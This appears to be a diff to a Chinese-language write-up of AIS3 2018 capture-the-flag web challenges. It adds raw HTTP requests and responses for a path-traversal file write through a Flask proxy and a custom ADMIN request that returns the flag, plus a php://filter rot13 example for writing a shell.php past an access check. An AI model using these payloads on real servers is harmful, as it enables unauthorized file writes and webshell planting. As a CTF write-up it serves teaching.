@@ -34,7 +34,57 @@ Client送出request後，Server會再把request發出去 (以這題來說，他�
 
 訪問`ADMIN /kaibro`，並POST帶上`QAQ`就能拿到FLAG惹
 
-`AIS3{f1aSk_pr0Xy_5Erver_15_N1Ce!!}`
+payload:
+
+寫檔:
+
+```
+GET /../../../password/kaibro HTTP/1.1
+Host: localhost:8787
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: _ga=GA1.1.434020595.1513762852
+Connection: close
+Upgrade-Insecure-Requests: 1
+```
+
+```
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 3
+Server: Werkzeug/0.14.1 Python/2.7.15
+Date: Sun, 05 Aug 2018 06:28:04 GMT
+
+QAQ
+```
+
+訪問ADMIN拿flag:
+
+```
+ADMIN /kaibro HTTP/1.1
+Host: srv02.ctf.ais3.org:8787
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 3
+
+QAQ
+```
+
+```
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 34
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sun, 05 Aug 2018 06:28:57 GMT
+
+AIS3{f1aSk_pr0Xy_5Erver_15_N1Ce!!}
+```
 
 ## misc 300
 
@@ -63,6 +113,8 @@ Client送出request後，Server會再把request發出去 (以這題來說，他�
 所以就得想辦法繞過這個限制，不然我們後面塞啥都不會被執行
 
 這裡用到的trick是，`file_put_contents`第一個參數可以用`php://filter`
+
+(類似這樣: `php://filter/write=string.rot13/resource=shell.php`)
 
 這邊我用`rot13`把Access Denied那一段轉成不會被解析的文字
 
